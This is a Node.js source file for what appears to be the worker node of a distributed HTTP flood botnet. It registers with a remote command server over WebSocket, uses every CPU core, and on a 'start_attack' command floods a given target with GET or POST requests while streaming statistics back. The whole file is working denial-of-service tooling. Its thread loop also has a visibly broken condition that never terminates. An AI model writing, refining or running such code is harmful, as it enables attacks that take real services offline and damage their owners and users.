const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const WebSocket = require('ws');
const got = require('got');
const MASTER_URL = process.env.MASTER_URL || 'ws://127.0.0.1:8080';
const REPORT_INTERVAL = 1000;

if (cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) cluster.fork();

    // 集群收统计
    let stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };
    Object.keys(cluster.workers).forEach(id => {
        cluster.workers[id].on('message', workerStats => {
            stats.totalRequests += workerStats.totalRequests;
            stats.successRequests += workerStats.successRequests;
            stats.errorRequests += workerStats.errorRequests;
            stats.totalResponseTime += workerStats.totalResponseTime;
        });
    });

    // 与 Master 通讯 + 心跳
    let ws;
    function connectMaster() {
        ws = new WebSocket(MASTER_URL);
        ws.on('open', () => {
            ws.send(JSON.stringify({ type: 'register_worker' }));
            console.log('[worker] Connected to master.');
        });
        ws.on('message', msg => {
            let data;
            try { data = JSON.parse(msg); } catch {}
            if (data && data.type === 'start_attack') {
                for (let id in cluster.workers) {
                    cluster.workers[id].send(data.config);
                }
            }
            if (data && data.type === 'stop_attack') {
                for (let id in cluster.workers) cluster.workers[id].send({ type: 'stop_attack' });
            }
            // 如果收到 type: 'pong'，可忽略，只为心跳
        });
        ws.on('close', () => setTimeout(connectMaster, 5000));
        ws.on('error', () => {});
        // 定时统计上报
        setInterval(() => {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'stats_update', stats }));
                stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };
            }
        }, REPORT_INTERVAL);

        // 定时发送WebSocket心跳
        setInterval(() => {
            if (ws.readyState === WebSocket.OPEN)
                ws.send(JSON.stringify({ type: 'ping' }));
        }, 30000); // 每30秒一次
    }
    connectMaster();
} else {
    let isAttacking = false;
    let attackConfig = null;
    let stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };

    function attackThread() {
        if (!isAttacking) return;
        (async () => {
            const startTime = Date.now();
            try {
                await got(attackConfig.target, {
                    method: attackConfig.mode === 'http-post' ? 'POST' : 'GET',
                    headers: attackConfig.headers || {},
                    body: attackConfig.body || undefined,
                    timeout: { request: 10000 }
                });
                stats.totalRequests++;
                stats.successRequests++;
                stats.totalResponseTime += (Date.now() - startTime);
            } catch {
                stats.totalRequests++;
                stats.errorRequests++;
            }
            setImmediate(attackThread);
        })();
    }
    process.on('message', msg => {
        if (msg.type === 'stop_attack') {
            isAttacking = false;
        } else {
            attackConfig = msg;
            isAttacking = true;
            stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };
            for (let i = 0; i < attackConfig.threads || 1000; i++) attackThread();
        }
    });
    setInterval(() => {
        process.send(stats);
        stats = { totalRequests: 0, successRequests: 0, errorRequests: 0, totalResponseTime: 0 };
    }, REPORT_INTERVAL);
}
